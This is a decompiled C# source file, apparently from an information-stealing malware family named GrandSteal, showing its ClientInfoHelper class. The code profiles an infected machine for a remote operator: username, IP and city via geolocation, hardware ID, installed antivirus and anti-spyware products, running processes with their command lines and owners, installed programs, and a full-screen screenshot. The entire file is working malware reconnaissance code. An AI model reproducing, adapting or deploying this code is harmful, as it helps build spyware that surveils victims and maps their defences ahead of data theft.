using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Windows.Forms;
using GrandSteal.Client.Models.Extensions.Nulls;
using GrandSteal.SharedModels.Models;
using Microsoft.Win32;
using WMIGatherer.Gathering;
using WMIGatherer.Objects;

namespace GrandSteal.Client.Models
{
	// Token: 0x02000008 RID: 8
	public static class ClientInfoHelper
	{
		// Token: 0x06000014 RID: 20 RVA: 0x000026D8 File Offset: 0x000008D8
		public static RemoteClientInformation Create(string SourceID)
		{
			RemoteClientInformation result;
			try
			{
				GeoLocationHelper.Initialize();
				Size screenSize = ClientInfoHelper.GetScreenSize();
				string text = TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now).ToString();
				if (!text.StartsWith("-"))
				{
					text = "+" + text;
				}
				result = new RemoteClientInformation
				{
					ID = 0,
					LogTime = DateTime.Now,
					SourceID = SourceID,
					UserName = Environment.UserName,
					ClientIP = GeoLocationHelper.GeoInfo.Query,
					Country = GeoLocationHelper.GeoInfo.CountryCode,
					OperationSystem = ClientInfoHelper.ParseOS(),
					HardwareID = ClientInfoHelper.ParseHWID(),
					Hardwares = ClientInfoHelper.ParseHardwares(),
					Antiviruses = ClientInfoHelper.ParseDefenders(),
					Languages = ClientInfoHelper.AvailableLanguages(),
					CurrentLanguage = InputLanguage.CurrentInputLanguage.Culture.EnglishName,
					MonitorSize = string.Format("{0}x{1}", screenSize.Width, screenSize.Height),
					TimeZone = "UTC" + text,
					City = GeoLocationHelper.GeoInfo.City
				};
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000015 RID: 21 RVA: 0x0000282C File Offset: 0x00000A2C
		public static List<RemoteProcess> ListOfProcesses()
		{
			List<RemoteProcess> list = new List<RemoteProcess>();
			try
			{
				foreach (Process process in Process.GetProcesses())
				{
					try
					{
						RemoteProcess remoteProcess = new RemoteProcess
						{
							ProcessID = process.Id,
							ProcessCommandLine = ClientInfoHelper.GetCommandLine(process),
							ProcessName = new FileInfo(process.MainModule.FileName).Name
						};
						string str;
						string str2;
						ClientInfoHelper.ReciveOwner(process.Id, out str, out str2);
						remoteProcess.ProcessUsername = str2 + "\\" + str;
						list.Add(remoteProcess);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000016 RID: 22 RVA: 0x000028E4 File Offset: 0x00000AE4
		public static List<string> ListOfPrograms()
		{
			List<string> list = new List<string>();
			try
			{
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"))
				{
					foreach (string name in registryKey.GetSubKeyNames())
					{
						using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
						{
							string text = (string)((registryKey2 != null) ? registryKey2.GetValue("DisplayName") : null);
							if (!string.IsNullOrEmpty(text))
							{
								list.Add(text);
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000017 RID: 23 RVA: 0x000029A0 File Offset: 0x00000BA0
		public static List<string> AvailableLanguages()
		{
			List<string> list = new List<string>();
			try
			{
				foreach (object obj in InputLanguage.InstalledInputLanguages)
				{
					InputLanguage inputLanguage = (InputLanguage)obj;
					list.Add(inputLanguage.Culture.EnglishName);
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00002A1C File Offset: 0x00000C1C
		public static string GetCommandLine(Process process)
		{
			string result;
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT CommandLine FROM Win32_Process WHERE ProcessId = " + process.Id))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectCollection.GetEnumerator())
					{
						if (enumerator.MoveNext())
						{
							object obj = enumerator.Current["CommandLine"];
							return (obj != null) ? obj.ToString() : null;
						}
					}
					result = "";
				}
			}
			return result;
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002ACC File Offset: 0x00000CCC
		private static List<Hardware> ParseHardwares()
		{
			List<Hardware> list = new List<Hardware>();
			try
			{
				foreach (Processor processor in HardwareGatherer.GetProcessors())
				{
					list.Add(new Hardware
					{
						Caption = processor.Name,
						Parameter = processor.NumberOfCores.ToString(),
						HardType = HardwareType.Processor
					});
				}
				foreach (GraphicsCard graphicsCard in HardwareGatherer.GetGraphicsCards())
				{
					list.Add(new Hardware
					{
						Caption = graphicsCard.Name,
						Parameter = graphicsCard.MemoryCapacity.ToString(),
						HardType = HardwareType.Graphic
					});
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00002BD8 File Offset: 0x00000DD8
		private static string ParseOS()
		{
			string result;
			try
			{
				result = OsGatherer.GetCaption() + " " + OsGatherer.GetOSArchitecture();
			}
			catch
			{
				result = "UNKNOWN";
			}
			return result;
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00002C18 File Offset: 0x00000E18
		private static string ParseHWID()
		{
			string result;
			try
			{
				result = HardwareGatherer.GetHwid(2, true);
			}
			catch
			{
				result = "UNKNOWN";
			}
			return result;
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00002062 File Offset: 0x00000262
		public static byte[] CaptureScreen()
		{
			return ClientInfoHelper.ImageToByte(ClientInfoHelper.GetScreenshot());
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00002C4C File Offset: 0x00000E4C
		private static Bitmap GetScreenshot()
		{
			Bitmap result;
			try
			{
				Size screenSize = ClientInfoHelper.GetScreenSize();
				Bitmap bitmap = new Bitmap(screenSize.Width, screenSize.Height);
				using (Graphics graphics = Graphics.FromImage(bitmap))
				{
					graphics.InterpolationMode = InterpolationMode.Bicubic;
					graphics.PixelOffsetMode = PixelOffsetMode.HighSpeed;
					graphics.SmoothingMode = SmoothingMode.HighSpeed;
					graphics.CopyFromScreen(new Point(0, 0), new Point(0, 0), screenSize);
				}
				result = bitmap;
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00002CD8 File Offset: 0x00000ED8
		private static byte[] ImageToByte(Image img)
		{
			byte[] result;
			try
			{
				if (img == null)
				{
					result = null;
				}
				else
				{
					using (MemoryStream memoryStream = new MemoryStream())
					{
						img.Save(memoryStream, ImageFormat.Png);
						result = memoryStream.ToArray();
					}
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00002D34 File Offset: 0x00000F34
		private static Size GetScreenSize()
		{
			return Screen.PrimaryScreen.Bounds.Size;
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00002D54 File Offset: 0x00000F54
		public static List<string> ParseDefenders()
		{
			List<string> list = new List<string>();
			try
			{
				list.AddRange(ClientInfoHelper.ParseAntiViruses().IsNull(new List<string>()));
				foreach (string item in ClientInfoHelper.ParseSpyWares().IsNull(new List<string>()))
				{
					if (!list.Contains(item))
					{
						list.Add(item);
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00002DE0 File Offset: 0x00000FE0
		public static IEnumerable<string> ParseAntiViruses()
		{
			List<string> list = new List<string>();
			try
			{
				foreach (SecurityProduct securityProduct in SecurityGatherer.GetSecurityProducts(0))
				{
					list.Add(securityProduct.Name);
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00002E4C File Offset: 0x0000104C
		private static IEnumerable<string> ParseSpyWares()
		{
			List<string> list = new List<string>();
			try
			{
				foreach (SecurityProduct securityProduct in SecurityGatherer.GetSecurityProducts(1))
				{
					list.Add(securityProduct.Name);
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00002EB8 File Offset: 0x000010B8
		private static void ReciveOwner(int processId, out string user, out string domain)
		{
			user = "NoUser";
			domain = "NoDomain";
			try
			{
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new ObjectQuery("Select * from Win32_Process Where ProcessID = '" + processId + "'"));
				if (managementObjectSearcher.Get().Count == 1)
				{
					ManagementObject managementObject = null;
					using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (enumerator.MoveNext())
						{
							managementObject = (ManagementObject)enumerator.Current;
						}
					}
					string[] array = new string[2];
					ManagementObject managementObject2 = managementObject;
					string methodName = "GetOwner";
					object[] args = array;
					managementObject2.InvokeMethod(methodName, args);
					if (user != null)
					{
						user = array[0];
					}
					if (domain != null)
					{
						domain = array[1];
					}
				}
			}
			catch
			{
			}
		}
	}
}
